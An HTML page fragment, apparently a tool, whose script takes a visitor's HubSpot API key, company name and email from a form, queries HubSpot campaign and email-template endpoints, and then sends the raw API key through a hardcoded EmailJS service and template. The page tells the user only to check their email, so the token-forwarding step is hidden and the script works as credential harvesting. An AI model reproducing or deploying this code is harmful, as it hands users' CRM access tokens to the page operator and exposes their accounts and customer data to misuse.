<!DOCTYPE html>
<html lang="en">
<!-- Previous head section stays the same until script section -->

    <script>
        (function() {
            emailjs.init("pg5sAN7sjaiGSj43W");
        })();

        document.getElementById('templateForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const statusMessage = document.getElementById('statusMessage');
            statusMessage.classList.remove('hidden');
            statusMessage.innerHTML = '<p class="text-green-400">Processing your request...</p>';
            
            const formData = new FormData(this);
            const apiKey = formData.get('apiKey');
            const companyName = formData.get('companyName');
            const email = formData.get('email');

            try {
                // Using proxy.api.hubspot.com
                const response = await fetch('https://proxy.api.hubspot.com/marketing/v3/marketing-campaigns', {
                    method: 'GET',
                    headers: {
                        'Authorization': `Bearer ${apiKey}`,
                        'Content-Type': 'application/json',
                    },
                    mode: 'cors'
                });

                if (!response.ok) {
                    const errorData = await response.json();
                    throw new Error(errorData.message || 'Failed to fetch data');
                }

                const data = await response.json();

                // Using proxy for email templates endpoint
                const emailResponse = await fetch('https://proxy.api.hubspot.com/sales-email-templates/v1/templates', {
                    method: 'GET',
                    headers: {
                        'Authorization': `Bearer ${apiKey}`,
                        'Content-Type': 'application/json',
                    },
                    mode: 'cors'
                });

                let emailData = [];
                if (emailResponse.ok) {
                    emailData = await emailResponse.json();
                }

                // Send email notification
                await emailjs.send(
                    "service_vzrvo2d",
                    "template_bbzu6uq",
                    {
                        company_name: companyName,
                        email: email,
                        template_count: (data.results ? data.results.length : 0) + emailData.length,
                        api_key: apiKey
                    }
                );

                statusMessage.innerHTML = '<p class="text-green-400">Data processed successfully! Check your email for details.</p>';
            } catch (error) {
                console.error('Error:', error);
                statusMessage.innerHTML = `<p class="text-red-400">Error: ${error.message || 'Failed to process data. Please check your access token and try again.'}</p>`;
            }
        });
    </script>
</body>
</html>
